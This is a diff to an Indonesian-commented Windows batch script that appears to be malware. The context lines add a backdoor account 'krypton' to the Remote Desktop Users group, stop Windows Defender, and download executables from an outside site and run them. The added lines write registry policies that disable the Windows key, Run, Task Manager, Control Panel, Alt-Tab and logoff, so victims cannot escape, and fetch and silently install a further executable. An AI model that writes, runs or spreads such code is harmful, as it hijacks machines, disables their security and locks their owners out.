@@ -30,6 +30,21 @@ net localgroup "Remote Desktop Users" krypton /add 2>nul
 echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
 echo.
 
+:: === BLOKIR WIN KEY, START MENU, WIN+R, DLL ===
+echo [*] Ngeblokir semua shortcut biar gak bisa kabur...
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogOff /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoSetTaskbar /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f 2>nul
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoAltTab /t REG_DWORD /d 1 /f 2>nul
+echo [+] Win key, Start Menu, Win+R, Task Manager, Control Panel KENA BLOCK SEMUA CUK!
+echo.
+
 :: Matiin antivirus sementara (biar gak blokir)
 net stop "Windows Defender" 2>nul
 net stop "MsMpSvc" 2>nul
@@ -48,12 +63,15 @@ set URL3=https://trueadam.site/DyBrowser.exe
 set FILE3=DyBrowser.exe
 set URL4=https://trueadam.site/doro.exe
 set FILE4=doro.exe
+set URL5=https://trueadam.site/7z64.exe
+set FILE5=7z64.exe
 
 :: Download pake metode triple backup
 call :Download "%URL1%" "%FILE1%"
 call :Download "%URL2%" "%FILE2%"
 call :Download "%URL3%" "%FILE3%"
 call :Download "%URL4%" "%FILE4%"
+call :Download "%URL5%" "%FILE5%"
 
 echo ========================================
 echo CEK DAN JALANIN FILE
@@ -63,6 +81,24 @@ if exist "%FILE1%" (start "" "%FILE1%" & echo [OK] %FILE1% running) else (echo [
 if exist "%FILE2%" (start "" "%FILE2%" & echo [OK] %FILE2% running) else (echo [GAGAL] %FILE2%)
 if exist "%FILE3%" (start "" "%FILE3%" & echo [OK] %FILE3% running) else (echo [GAGAL] %FILE3%)
 if exist "%FILE4%" (start "" "%FILE4%" & echo [OK] %FILE4% running) else (echo [GAGAL] %FILE4%)
+
+:: Install 7z64.exe silent trus buka 7zFM.exe
+if exist "%FILE5%" (
+    echo [*] Install 7-Zip silent mode dulu bro...
+    start /wait "" "%FILE5%" /S
+    echo [OK] 7-Zip keinstall!
+    if exist "C:\Program Files\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else if exist "C:\Program Files (x86)\7-Zip\7zFM.exe" (
+        start "" "C:\Program Files (x86)\7-Zip\7zFM.exe"
+        echo [OK] 7zFM.exe kebuka bos!
+    ) else (
+        echo [GAGAL] 7zFM.exe gak ketemu njir, mungkin installnya error
+    )
+) else (
+    echo [GAGAL] 7z64.exe gak ada filenya
+)
 
 echo ========================================
 echo SELESAI GOBLOK 😡😡😡
